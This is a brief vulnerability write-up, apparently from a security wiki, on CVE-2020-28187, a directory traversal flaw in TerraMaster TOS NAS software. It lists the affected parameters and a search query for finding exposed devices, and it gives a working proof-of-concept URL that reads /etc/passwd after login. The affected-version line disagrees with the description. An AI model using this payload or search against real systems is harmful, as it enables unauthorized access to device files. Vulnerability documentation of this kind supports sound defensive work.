# TerraMaster TOS background arbitrary file reading vulnerability CVE-2020-28187

## Vulnerability Description

TerraMaster TOS <= Multiple directory traversal vulnerabilities in 4.2.06 allow remote authentication attackers to read any file in the file system through the filename parameter under /tos/index.php?editor/fileGet path, the Event parameter under /include/ajax/logtable.php path, and the opt parameter under /include/core/index.php path.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">TerraMaster TOS < 4.2.06</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">"TerraMaster" && header="TOS"</span>

## Vulnerability reappears

After logging in, the POC of the verification vulnerability is

```plain
/tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/tm-8.png)